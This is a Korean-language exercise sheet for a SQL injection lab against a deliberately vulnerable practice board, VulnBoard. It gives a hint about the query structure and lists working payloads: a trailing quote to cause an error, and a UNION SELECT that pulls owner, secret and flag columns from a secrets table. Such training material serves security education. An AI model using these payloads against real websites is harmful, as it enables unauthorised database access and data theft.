# 문제 06. 게시글 ID 기반 SQL Injection (현실에서 가장 흔한 패턴)

**책 매핑**: Ch04 SQL Injection

**실습 타겟**: VulnBoard ( /post/1 , /post/2 등)

## 목표
- /post/1' 로 에러를 유발해 쿼리 구조 파악
- UNION 또는 Blind로 secrets 테이블 flag 추출
- 실제 웹사이트에서 가장 많이 보이는 "숫자 ID를 직접 쓰는" 패턴 공격 연습

## 성공 기준
secrets 테이블의 FLAG 중 최소 1개 이상 획득

## 주요 페이로드
```
/post/1'
/post/1 AND 1=2 UNION SELECT 1,owner,secret,flag,5,6 FROM secrets --
```

## 힌트
쿼리가 `WHERE p.id = {post_id}` 형태로 되어 있습니다. 숫자 뒤에 ' 를 붙여보세요.

자세한 풀이는 풀이.md 참고.